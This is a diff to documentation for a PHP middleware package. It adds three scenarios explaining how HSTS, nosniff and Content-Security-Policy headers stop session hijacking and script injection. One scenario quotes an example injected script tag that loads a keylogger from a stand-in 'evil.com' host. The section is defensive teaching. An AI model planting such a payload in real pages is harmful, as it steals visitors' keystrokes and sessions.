@@ -1,5 +1,17 @@
 # Security headers
 
+## Why you would want this — three concrete scenarios
+
+**Stolen session cookie.** Your user logs into your admin panel from a hotel wifi. The wifi access point downgrades their connection to HTTP for two seconds during the initial DNS lookup. The browser sends the session cookie in clear text. Attacker on the same network captures it, replays it, hijacks the session. With **HSTS** (`Strict-Transport-Security: max-age=31536000`), the browser refuses any HTTP downgrade for the next year — the request stays HTTPS or fails closed.
+
+**Uploaded "harmless.jpg" executes as JavaScript.** You let users upload avatars. An attacker uploads a file whose bytes are valid JavaScript with a `.jpg` extension. When a victim's browser fetches the avatar, your CDN serves it with no `Content-Type`, the browser sniffs the content, sees JS, executes it in your origin context — full session hijack. With `X-Content-Type-Options: nosniff`, the browser is forced to use the declared MIME type and refuses to execute non-JS content.
+
+**Single injected `<script>` owns every visitor.** A user posts a comment containing `<script src="https://evil.com/keylogger.js"></script>`. Without a strict **Content-Security-Policy**, every visitor's browser fetches and runs that script — keyloggers, cookie stealing, drive-by downloads. With `default-src 'self'`, the browser refuses to load any script that isn't from your own origin.
+
+Each of these headers is a one-line server-side switch that blocks an entire class of browser attack. The helpers below apply them in one call with typed values — no magic strings, no easy-to-forget directives.
+
+---
+
 `oihana/php-middleware` ships three procedural helpers to apply the most common HTTP security response headers to a PSR-7 response:
 
 - [`withSecurityHeaders()`](#withsecurityheaders) — the single entry point that applies HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Content-Security-Policy, the three Cross-Origin policies (COOP / COEP / CORP) and Permissions-Policy in one call.
